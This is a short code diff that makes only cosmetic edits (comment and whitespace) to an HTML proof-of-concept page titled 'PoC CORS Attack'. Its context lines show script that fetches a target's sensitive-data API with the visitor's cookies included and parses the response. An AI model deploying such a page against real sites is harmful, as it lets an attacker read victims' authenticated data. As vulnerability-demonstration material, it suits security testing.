@@ -1,5 +1,4 @@
-//new
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html>
 <head>
     <title>PoC CORS Attack</title>
@@ -12,7 +11,7 @@
                 const response = await fetch('https://vulnerableapp.com/api/sensitive-data', {
                     method: 'GET',
                     credentials: 'include' // Send cookies along with the request
-                });
+                }); // new
 
                 if (response.ok) {
                     const data = await response.json();
